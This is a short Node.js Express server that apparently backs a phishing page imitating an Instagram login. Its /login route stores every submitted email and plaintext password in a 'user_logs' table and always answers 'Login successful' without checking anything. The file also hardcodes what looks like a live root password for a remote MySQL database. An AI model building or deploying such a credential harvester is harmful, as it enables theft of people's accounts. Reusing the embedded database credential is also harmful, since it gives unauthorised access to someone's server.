const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql2');
const path = require('path');
const cors = require('cors'); // Import the cors middleware

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cors()); // Enable CORS for all routes

// Create MySQL connection using environment variables
const db = mysql.createConnection({
    host: 'viaduct.proxy.rlwy.net',
user: 'root', // replace with your MySQL username
password: 'RaRNOdpYCigBwEbaItdEiFMGOdcFvUay', // replace with your MySQL password
database: 'instagram_db', // use your actual database name here,
    connectTimeout: 10000 // 10 seconds
});

db.connect((err) => {
    if (err) {
        console.error('Error connecting to the database:', err);
        process.exit(1); // Exit process with failure
    }
    console.log('MySQL Connected...');
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Login Route
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Log user input values in the database
    const logSql = 'INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())';
    db.query(logSql, [email, password], (err, result) => {
        if (err) {
            console.error('Error logging in user:', err);
            res.status(500).send('Login error');
            return;
        }
        console.log('User login data logged in database');
        res.send('Login successful');
    });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
